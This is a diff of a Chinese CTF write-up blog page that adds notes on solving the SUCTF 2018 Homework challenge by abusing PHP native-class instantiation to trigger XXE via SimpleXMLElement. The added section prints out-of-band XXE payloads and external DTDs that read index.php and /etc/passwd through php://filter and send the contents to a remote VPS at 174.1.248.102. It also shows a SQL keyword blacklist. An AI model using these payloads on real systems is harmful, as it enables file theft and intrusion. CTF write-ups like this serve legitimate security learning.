@@ -93,7 +93,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/04/11/n6xOef7up9vEGcV.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/11/J1s9AvfiX4Q2mrh.png">
 <meta property="article:published_time" content="2020-04-02T13:32:32.000Z">
-<meta property="article:modified_time" content="2020-04-11T15:06:05.262Z">
+<meta property="article:modified_time" content="2020-04-12T03:32:53.621Z">
 <meta property="article:author" content="glotozz">
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
@@ -636,8 +636,47 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $black_str = <span class="string">"/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i"</span>;</span><br><span class="line"></span><br><span class="line">    $str = preg_replace($black_str, <span class="string">"@@"</span>,$str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addslashes($str);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <hr>
-<p>##############</p>
-<h4><span id="suctf-2018homework">[SUCTF 2018]Homework</span></h4>
+<p>##############04/12</p>
+<h4><span id="suctf-2018homework">[SUCTF 2018]Homework</span></h4><blockquote>
+<p>参考：<a href="https://www.jianshu.com/p/825d08f530c5" target="_blank" rel="noopener">https://www.jianshu.com/p/825d08f530c5</a> </p>
+</blockquote>
+<p>注册登录，发现有一段自定义calc类的源码，点击calc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show.php?module&#x3D;calc&amp;args[]&#x3D;2&amp;args[]&#x3D;a&amp;args[]&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<p>根据url，猜测传入的<code>module</code>为类名，<code>args[]</code>为参数</p>
+<p>之前提到过，如果能实例化任何类，可以利用一些原生类</p>
+<blockquote>
+<p>可获取目录：<code>DirectoryIterator</code></p>
+<p>XXE：<code>SimpleXMLElement</code></p>
+<p>创建空白文件：<code>SQLite3</code></p>
+</blockquote>
+<p>其中危害较大的是XXE，看下<code>SimpleXMLElement</code>的官方文档</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">final public SimpleXMLElement::__construct ( string $data [, int $options &#x3D; 0 [, bool $data_is_url &#x3D; FALSE [, string $ns &#x3D; &quot;&quot; [, bool $is_prefix &#x3D; FALSE ]]]] )</span><br></pre></td></tr></table></figure>
+
+<p><strong>法一、</strong></p>
+<p>第一个参数是要解析的数据，第二个参数是一些选项，这里可以传2，第三个参数设置true是允许url格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?module&#x3D;SimpleXMLElement&amp;args[]&#x3D;http:&#x2F;&#x2F;174.1.248.102&#x2F;obj.xml&amp;args[]&#x3D;2&amp;args[]&#x3D;true</span><br></pre></td></tr></table></figure>
+
+<p><code>obj.xml</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE try[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % int SYSTEM "http://174.1.248.102/test.xml"&gt;</span></span><br><span class="line"><span class="meta">%int;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>test.xml</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">payl</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">index.php</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % all "&lt;!ENTITY &amp;#37; send SYSTEM 'http://174.1.248.102:1234/?%payl;'&gt;"&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但是vps没有收到</p>
+<p>而且感觉payload的第三个参数由于get传参得到的是字符串的<code>true</code></p>
+<p><strong>法二、</strong></p>
+<p>直接get传xml数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?module&#x3D;SimpleXMLElement&amp;args[]&#x3D;%3C%3Fxml%20version%3D%221.0%22%2B%3F%3E%0A%3C%21DOCTYPE%20r%20%5B%0A%3C%21ELEMENT%20r%20ANY%20%3E%0A%3C%21ENTITY%20%25%20sp%20SYSTEM%22http%3A%2F%2F174.1.248.102%2Ftest.xml%22%3E%0A%25sp%3B%0A%25param1%3B%0A%5D%3E%0A%3Cr%3E%26exfil%3B%3C%2Fr%3E&amp;args[]&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<p><code>args[0]</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"+?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT r ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM"http://174.1.248.102/test.xml"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span>&amp;exfil;<span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>test.xml</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">data</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">convert.base64-encode</span>/<span class="attr">resource</span>=<span class="string">/etc/passwd</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'http://174.1.248.102:1234/?%data;'&gt;"&gt;</span><br></pre></td></tr></table></figure>
+
+<p>还是没回显，迷</p>
+
             </div>
           
 
